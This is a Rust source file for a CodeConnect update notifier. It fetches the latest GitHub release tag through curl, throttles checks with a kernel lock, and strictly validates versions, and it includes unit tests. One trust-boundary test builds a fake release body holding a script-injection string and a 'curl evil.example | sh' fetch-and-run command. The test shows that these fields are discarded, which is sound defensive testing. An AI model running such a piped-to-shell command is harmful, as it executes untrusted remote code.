//! The "a newer CodeConnect exists" notice, and the machinery behind it.
//!
//! A user who runs `codeconnect claude` every day has no reason to think
//! about upgrading, so the launch tells them — under three rules that keep
//! the telling honest and the launch fast:
//!
//!   * **The launch path never touches the network.** The notice is read
//!     from a cache file; the cache is refreshed by a fully detached child
//!     spawned just before the attach, at most once per 24 hours. A slow or
//!     absent network costs the launch nothing.
//!   * **"Newer" means a published GitHub Release**, semantically greater
//!     than this binary's own version — never "a commit exists". The feature
//!     is deliberately dormant until the project starts cutting releases;
//!     the ship contract from then on is: bump the workspace version, tag
//!     that exact commit `vX.Y.Z`, publish the Release, versions strictly
//!     increasing, never retag.
//!   * **The tag is a trust boundary.** It comes from a third-party API
//!     response, so nothing from that response is compared or printed until
//!     it has survived a full-match semver validation; every other response
//!     field is discarded unread. An error — 404, rate limit, timeout,
//!     malformed JSON — is not evidence and produces silence, preserving
//!     whatever validated answer the cache already held.
//!
//! `update_check: false` in the config disables both the network attempt
//! and the cached notice. The daemon never phones home either way.

use std::path::PathBuf;

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};

/// Where the checker's answer lives between launches.
fn cache_path() -> PathBuf {
    protocol::root_dir().join("update-check.json")
}

/// The claim that makes the 24-hour throttle hold across processes — two
/// `codeconnect claude` launches in the same second must produce at most one
/// GitHub request. The atom is `flock(2)`, and the kernel is the whole
/// protocol: a lock dies with its holder, so there are no corpses to detect,
/// no birth-times to compare, and no takeover race between two would-be
/// breakers. A file-content lock needs all three, and each is its own race:
/// a created-then-written lock is momentarily empty and reads as a corpse,
/// and two breakers judging one corpse can each delete the other's fresh
/// claim. The lock file itself is permanent and contentless.
fn lock_path() -> PathBuf {
    protocol::root_dir().join(".update-check.lock")
}

const ATTEMPT_INTERVAL_SECS: u64 = 24 * 60 * 60;
/// A Releases response is a few hundred bytes of interest; a response bigger
/// than this is not one we read further.
const MAX_RESPONSE_BYTES: u64 = 64 * 1024;

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct UpdateCache {
    /// When the checker last *tried*, successful or not — the 24h throttle.
    #[serde(default)]
    pub last_attempt_unix: u64,
    /// The last validated answer to "what is the latest release", kept
    /// verbatim (`1.2.3`, no `v`). Mirrors the server: each validated fetch
    /// replaces it, whatever it says; only *failures* preserve the previous
    /// answer. The notice, not the cache, decides what counts as newer.
    #[serde(default)]
    pub latest: Option<String>,
}

// ---------------------------------------------------------------- versions

/// Parse a version or a release tag into its numeric triple.
///
/// Full-match and ASCII-only on purpose: this is the entire trust boundary
/// for a string a third party controls. An optional leading `v` is the one
/// tag convention accepted; anything else — whitespace, suffixes, control
/// characters, Unicode digits, a fourth component, leading zeroes — is not a
/// version, and "not a version" must never become "version zero".
pub fn parse_version(raw: &str) -> Option<(u64, u64, u64)> {
    let body = raw.strip_prefix('v').unwrap_or(raw);
    let mut parts = body.split('.');
    let (a, b, c) = (parts.next()?, parts.next()?, parts.next()?);
    if parts.next().is_some() {
        return None;
    }
    let component = |part: &str| -> Option<u64> {
        if part.is_empty() || !part.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        if part.len() > 1 && part.starts_with('0') {
            return None;
        }
        part.parse::<u64>().ok()
    };
    Some((component(a)?, component(b)?, component(c)?))
}

/// The version compiled into this binary. The `expect` is exercised by a
/// test, which is what makes it a release-gate rather than a hope: a
/// workspace version this parser refuses would fail CI before it failed a
/// user.
pub fn installed_version() -> (u64, u64, u64) {
    parse_version(env!("CARGO_PKG_VERSION")).expect("CARGO_PKG_VERSION is not a plain X.Y.Z semver")
}

// ------------------------------------------------------------------ cache

/// Read the cache, revalidating the stored version — a cache written by
/// anything, including a future or corrupted build, gets the same trust
/// boundary as the network response.
pub fn read_cache() -> UpdateCache {
    read_cache_from(&cache_path())
}

fn read_cache_from(path: &std::path::Path) -> UpdateCache {
    let Ok(bytes) = std::fs::read(path) else {
        return UpdateCache::default();
    };
    let Ok(mut cache) = serde_json::from_slice::<UpdateCache>(&bytes) else {
        return UpdateCache::default();
    };
    if let Some(latest) = &cache.latest {
        if parse_version(latest).is_none() {
            cache.latest = None;
        }
    }
    cache
}

/// Atomic write: unique temp file beside the target, then rename, so an
/// interrupted write leaves the previous record readable rather than half a
/// JSON document.
fn write_cache_to(path: &std::path::Path, cache: &UpdateCache) -> Result<()> {
    let parent = path
        .parent()
        .context("the cache path has no parent directory")?;
    std::fs::create_dir_all(parent)?;
    let temp = parent.join(format!(".update-check.{}.tmp", std::process::id()));
    std::fs::write(&temp, serde_json::to_vec(cache)?)?;
    std::fs::rename(&temp, path)?;
    Ok(())
}

/// Holds the kernel lock for as long as it lives; dropping — or dying, in
/// any way — is what releases it. `flock` locks belong to the open file
/// description, and the kernel cleans up when that closes.
struct ThrottleClaim {
    _file: std::fs::File,
}

fn claim_throttle_at(path: &std::path::Path) -> Option<ThrottleClaim> {
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let file = std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(false)
        .open(path)
        .ok()?;
    use std::os::fd::AsRawFd;
    // Non-blocking exclusive: the loser leaves rather than queues — a
    // second simultaneous launch has nothing to wait for, the winner is
    // already doing the day's one check.
    let rc = unsafe { libc::flock(file.as_raw_fd(), libc::LOCK_EX | libc::LOCK_NB) };
    if rc != 0 {
        return None;
    }
    Some(ThrottleClaim { _file: file })
}

/// Whether the 24-hour throttle permits an attempt now. A future
/// `last_attempt` is a clock that moved backwards; treating it as "recently
/// attempted" would silence the checker for however far forward the clock
/// had wandered, so it reads as due.
pub fn attempt_due(cache: &UpdateCache, now_unix: u64) -> bool {
    cache.last_attempt_unix > now_unix
        || now_unix - cache.last_attempt_unix >= ATTEMPT_INTERVAL_SECS
}

// ----------------------------------------------------------------- notice

/// The launch notice, or `None` while this binary is current (or nothing
/// validated is known). Pure, so the copy and the comparison are pinned.
pub fn notice(cache: &UpdateCache, installed: (u64, u64, u64)) -> Option<String> {
    let latest_raw = cache.latest.as_deref()?;
    let latest = parse_version(latest_raw)?;
    if latest <= installed {
        return None;
    }
    let (a, b, c) = installed;
    Some(format!(
        "  note: CodeConnect {a}.{b}.{c} is installed; {latest_raw} is available.\n\n  \
         from the root of your CodeConnect checkout, run:\n\n      \
         git pull --ff-only && cd mac && ./install.sh"
    ))
}

/// The notice for the current install, from the cache on disk.
pub fn cached_notice() -> Option<String> {
    notice(&read_cache(), installed_version())
}

// ---------------------------------------------------------------- checker

/// Spawn the detached checker if the throttle permits. Fire-and-forget: null
/// stdio, its own process group, never waited on — the attach that follows
/// replaces this process, and the child must outlive it without owning the
/// terminal.
pub fn spawn_checker_if_due() {
    if !attempt_due(&read_cache(), unix_now()) {
        return;
    }
    let Ok(current) = std::env::current_exe() else {
        return;
    };
    use std::os::unix::process::CommandExt;
    let _ = std::process::Command::new(current)
        .arg("__update-check")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .process_group(0)
        .spawn();
}

/// The hidden child: ask GitHub for the latest release and update the cache.
///
/// Every failure path still advances `last_attempt` — a flaky network must
/// throttle like a healthy one — and preserves the previously validated
/// `latest`. Config is consulted here too, so a child spawned an instant
/// before the operator wrote `update_check: false` still obeys it.
pub fn run_checker() -> Result<()> {
    if !protocol::config::Config::load().update_check {
        return Ok(());
    }
    run_checker_with(
        &cache_path(),
        &lock_path(),
        unix_now(),
        fetch_latest_release_tag,
    )
}

/// The checker's whole discipline, fetch injected so a test can prove the
/// ordering without a network:
///
///   1. take the cross-process lock, or leave — two simultaneous launches
///      spawn two children, and at most one may go to GitHub;
///   2. re-check the throttle *under* the lock — the parent's check was
///      against a cache another child may have advanced since;
///   3. claim the attempt (persist `last_attempt`) **before** fetching, so a
///      child that dies mid-fetch still throttled — a crashing checker must
///      not retry every launch;
///   4. fetch, and only a validated answer replaces `latest`.
fn run_checker_with(
    cache_file: &std::path::Path,
    lock_file: &std::path::Path,
    now_unix: u64,
    fetch: impl FnOnce() -> Option<String>,
) -> Result<()> {
    let Some(_claim) = claim_throttle_at(lock_file) else {
        return Ok(());
    };
    let mut cache = read_cache_from(cache_file);
    if !attempt_due(&cache, now_unix) {
        return Ok(());
    }
    cache.last_attempt_unix = now_unix;
    write_cache_to(cache_file, &cache)?;
    if let Some(tag) = fetch() {
        // Normalized without the `v`, so the cache holds exactly what the
        // notice prints.
        let normalized = tag.strip_prefix('v').unwrap_or(&tag).to_string();
        cache.latest = Some(normalized);
        write_cache_to(cache_file, &cache)?;
    }
    Ok(())
}

/// The latest published release's tag, if the network, the API and the
/// validation all cooperate. `None` is silence, never evidence.
fn fetch_latest_release_tag() -> Option<String> {
    let output = std::process::Command::new("/usr/bin/curl")
        .args([
            // First, always: without it curl reads ~/.curlrc, which can add
            // URLs, redirect output or attach headers — and the README's
            // promise is one documented request, not one plus whatever a
            // dotfile says.
            "-q",
            "-fsS",
            "--max-time",
            "5",
            "--max-filesize",
            "65536",
            "-H",
            "Accept: application/vnd.github+json",
            // The one non-tailnet request CodeConnect ever makes, documented
            // in the README's privacy note and disabled by `update_check:
            // false`. GitHub's "latest" is the newest published non-draft,
            // non-prerelease Release.
            "https://api.github.com/repos/faisalmumtaz89/CodeConnect/releases/latest",
        ])
        .stdin(std::process::Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    parse_release_tag(&output.stdout)
}

/// Extract and validate `tag_name` — the only field this feature is allowed
/// to read. The deserialization target *has* no other fields, so the rest of
/// the response is skipped by the parser rather than materialized and then
/// ignored: untrusted text never exists in memory as anything but the bytes
/// it arrived in.
pub fn parse_release_tag(body: &[u8]) -> Option<String> {
    #[derive(serde::Deserialize)]
    struct LatestRelease {
        tag_name: String,
    }
    let capped = &body[..body.len().min(MAX_RESPONSE_BYTES as usize)];
    let release = serde_json::from_slice::<LatestRelease>(capped).ok()?;
    parse_version(&release.tag_name)?;
    Some(release.tag_name)
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ------------------------------------------------------------- parser

    #[test]
    fn the_parser_accepts_plain_and_v_prefixed_semver_and_nothing_else() {
        assert_eq!(parse_version("1.2.3"), Some((1, 2, 3)));
        assert_eq!(parse_version("v1.2.3"), Some((1, 2, 3)));
        assert_eq!(parse_version("0.1.0"), Some((0, 1, 0)));

        for rejected in [
            " 1.2.3",
            "1.2.3 ",
            "1.2.3\n",
            "\u{1b}[31m1.2.3",
            "1.2.3-rc1",
            "1.2",
            "1.2.3.4",
            "1..3",
            "",
            "v",
            "V1.2.3",
            "١.٢.٣",
            "01.2.3",
            "1.02.3",
            "99999999999999999999.0.0",
        ] {
            assert_eq!(parse_version(rejected), None, "accepted {rejected:?}");
        }
    }

    #[test]
    fn versions_compare_numerically_never_textually() {
        assert!(parse_version("1.10.0").unwrap() > parse_version("1.9.0").unwrap());
        assert!(parse_version("10.0.0").unwrap() > parse_version("9.99.99").unwrap());
    }

    /// The release gate: a workspace version this parser refuses would fail
    /// here, in CI, before it failed at a user's launch.
    #[test]
    fn the_workspace_version_is_parseable() {
        installed_version();
    }

    // ----------------------------------------------------- trust boundary

    #[test]
    fn only_the_tag_name_survives_the_response() {
        let body = br#"{
            "tag_name": "v0.2.0",
            "name": "PWNED <script>alert(1)</script>",
            "body": "curl evil.example | sh",
            "html_url": "https://evil.example"
        }"#;
        assert_eq!(parse_release_tag(body).as_deref(), Some("v0.2.0"));

        let cache = UpdateCache {
            last_attempt_unix: 0,
            latest: Some("0.2.0".into()),
        };
        let notice = notice(&cache, (0, 1, 0)).unwrap();
        assert!(!notice.contains("PWNED"));
        assert!(!notice.contains("evil.example"));
    }

    #[test]
    fn a_malformed_response_is_silence_not_evidence() {
        for body in [
            &b"not json"[..],
            br#"{"tag_name": 7}"#,
            br#"{"tag_name": "release-1"}"#,
            br#"{"tag_name": "1.2.3\n"}"#,
            br#"{}"#,
            b"",
        ] {
            assert_eq!(parse_release_tag(body), None);
        }
    }

    // -------------------------------------------------------------- cache

    #[test]
    fn the_throttle_is_a_day_and_a_backwards_clock_reads_as_due() {
        let cache = |at: u64| UpdateCache {
            last_attempt_unix: at,
            latest: None,
        };
        assert!(
            attempt_due(&cache(0), 1_700_000_000),
            "never attempted (epoch zero) is always at least a day ago"
        );
        assert!(
            !attempt_due(&cache(1_000), 1_000 + 86_399),
            "inside the day"
        );
        assert!(attempt_due(&cache(1_000), 1_000 + 86_400), "the day is up");
        assert!(
            attempt_due(&cache(2_000_000), 1_000),
            "a future stamp means the clock moved; silence until it catches \
             up again would be unbounded"
        );
    }

    fn temp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("cc-uchk-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// Through `read_cache_from` on a real file — the seam the revalidation
    /// lives behind. The first version of this test built the struct in
    /// memory and never touched the read path; deleting the revalidation
    /// did not fail it.
    #[test]
    fn a_garbage_cached_version_is_dropped_on_read() {
        let dir = temp_dir("reval");
        let path = dir.join("update-check.json");
        std::fs::write(
            &path,
            br#"{"last_attempt_unix":5,"latest":"not-a-version"}"#,
        )
        .unwrap();
        let cache = read_cache_from(&path);
        assert_eq!(cache.latest, None, "garbage must not survive the read");
        assert_eq!(
            cache.last_attempt_unix, 5,
            "the throttle stamp is untainted"
        );
        assert_eq!(notice(&cache, (0, 1, 0)), None);
        std::fs::remove_dir_all(&dir).ok();
    }

    // ------------------------------------------------------------ checker

    /// The claim-before-fetch ordering, observed from inside the fetch: by
    /// the time the network runs, the attempt is already on disk, so a
    /// checker that dies mid-fetch has still throttled.
    #[test]
    fn the_attempt_is_claimed_before_the_fetch_runs() {
        let dir = temp_dir("claim");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let seen = std::cell::Cell::new(0u64);
        run_checker_with(&cache_file, &lock_file, 1_700_000_000, || {
            seen.set(read_cache_from(&cache_file).last_attempt_unix);
            None
        })
        .unwrap();
        assert_eq!(
            seen.get(),
            1_700_000_000,
            "the fetch must find the attempt already persisted"
        );
        let after = read_cache_from(&cache_file);
        assert_eq!(after.latest, None, "a failed fetch adds no version");
        assert_eq!(after.last_attempt_unix, 1_700_000_000);
        std::fs::remove_dir_all(&dir).ok();
    }

    /// The lock is the kernel's cross-process atom: while one open file
    /// description holds it, a second claim loses without waiting.
    #[test]
    fn the_kernel_lock_admits_one_holder_and_frees_on_release() {
        let dir = temp_dir("lock");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let now = 1_700_000_000u64;

        let claim = claim_throttle_at(&lock_file).expect("first claim wins");
        let mut fetched = false;
        run_checker_with(&cache_file, &lock_file, now, || {
            fetched = true;
            None
        })
        .unwrap();
        assert!(
            !fetched,
            "a held lock means another checker owns the window"
        );

        // Release — by drop here, by death anywhere — frees the next claim
        // against the same path immediately. No staleness protocol exists to
        // test, because no corpse can exist: the lock lives in the kernel,
        // not in the file, and dies with its holder. That property is what
        // deleted the publish/judge/break steps a file-content lock needed,
        // each of which carried a measured race.
        drop(claim);
        assert!(
            claim_throttle_at(&lock_file).is_some(),
            "release frees the next claimant; nothing to time out, nothing to break"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    /// The child re-checks the throttle under the lock: the parent judged a
    /// cache another child may have advanced in the meantime.
    #[test]
    fn the_child_rechecks_the_throttle_under_the_lock() {
        let dir = temp_dir("recheck");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let now = 1_700_000_000u64;
        std::fs::write(
            &cache_file,
            format!(r#"{{"last_attempt_unix":{},"latest":null}}"#, now - 60),
        )
        .unwrap();
        let mut fetched = false;
        run_checker_with(&cache_file, &lock_file, now, || {
            fetched = true;
            None
        })
        .unwrap();
        assert!(!fetched, "another child attempted a minute ago; not due");
        std::fs::remove_dir_all(&dir).ok();
    }

    // ------------------------------------------------------------- notice

    #[test]
    fn the_notice_names_both_versions_and_the_exact_command() {
        let cache = UpdateCache {
            last_attempt_unix: 0,
            latest: Some("0.2.0".into()),
        };
        let text = notice(&cache, (0, 1, 0)).unwrap();
        assert_eq!(
            text,
            "  note: CodeConnect 0.1.0 is installed; 0.2.0 is available.\n\n  \
             from the root of your CodeConnect checkout, run:\n\n      \
             git pull --ff-only && cd mac && ./install.sh"
        );
    }

    #[test]
    fn equal_and_older_releases_stay_silent() {
        let cache = |latest: &str| UpdateCache {
            last_attempt_unix: 0,
            latest: Some(latest.into()),
        };
        assert_eq!(notice(&cache("0.1.0"), (0, 1, 0)), None, "equal is current");
        assert_eq!(
            notice(&cache("0.0.9"), (0, 1, 0)),
            None,
            "older is not news"
        );
        assert!(notice(&cache("0.1.1"), (0, 1, 0)).is_some());
        assert_eq!(
            notice(&UpdateCache::default(), (0, 1, 0)),
            None,
            "no validated answer, no claim"
        );
    }
}
